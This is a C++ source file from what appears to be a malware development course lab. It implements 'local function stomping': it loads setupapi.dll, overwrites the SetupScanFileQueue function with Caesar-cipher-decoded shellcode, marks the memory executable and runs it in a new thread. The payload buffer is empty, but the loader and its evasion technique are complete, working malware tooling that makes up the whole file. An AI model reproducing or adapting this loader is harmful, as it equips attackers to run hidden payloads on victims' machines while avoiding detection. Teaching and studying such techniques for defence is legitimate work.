/*
* Lab 03 | Malware Dev Fall 2023
* Local Function Stomping
* coremed | willjcim
*/

#include <windows.h>
#include <iostream>


// set our target dll module and function to stomp
#define TARGET_DLL  "setupapi.dll"
#define TARGET_FUNC "SetupScanFileQueue"

// x64 calc shellcode
unsigned char shellcode[] = "";

// caesar cipher function
void cc(unsigned char* shellcode, int shift, int size) {
	int i = 0;
	do {
		shellcode[i] = (int(shellcode[i]) - shift % 255);
		i++;
	} while (i < (size - 1));
}

BOOL StompFunction(PVOID pAddr, PBYTE pShellcode, SIZE_T sShellcodeSize) {
	// declare and init dwOldProtection variable
	DWORD dwOldProtection = NULL;

	// set target memory protection to RW
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RW failed with error code: %d\n", GetLastError());
		return FALSE;
	}

	// decrypt 
	int shift = 3;
	cc(shellcode, shift, sizeof(shellcode));

	// copy our shellcode to target region
	RtlCopyMemory(pAddr, pShellcode, sShellcodeSize);

	// set target memory protection to RWX 
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RWX failed with error code: %d\n", GetLastError());
		return FALSE;
	}
	// function successfully stomped
	return TRUE;
}

int main() {
	// declare some variables
	PVOID   pAddr = NULL;
	HMODULE hModule = NULL;
	HANDLE  hThread = NULL;

	// prepare to load dll module
	printf("Load module %s?\n", TARGET_DLL);
	system("pause");

	// load dll module
	hModule = LoadLibraryA(TARGET_DLL);
	printf("Module %s loaded\n", TARGET_DLL);
	system("pause");

	// find function addr in memory
	pAddr = GetProcAddress(hModule, TARGET_FUNC);
	printf("Found function %s at 0x%llx\n", TARGET_FUNC, pAddr);
	printf("Stomp function?\n");
	system("pause");

	// stomp function
	if (!StompFunction(pAddr, shellcode, sizeof(shellcode))) {
		return -1;
	}

	printf("Function stomped!\n");
	printf("Execute shellcode?\n");
	system("pause");

	// execute our shellcode
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pAddr, 0, 0, 0);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}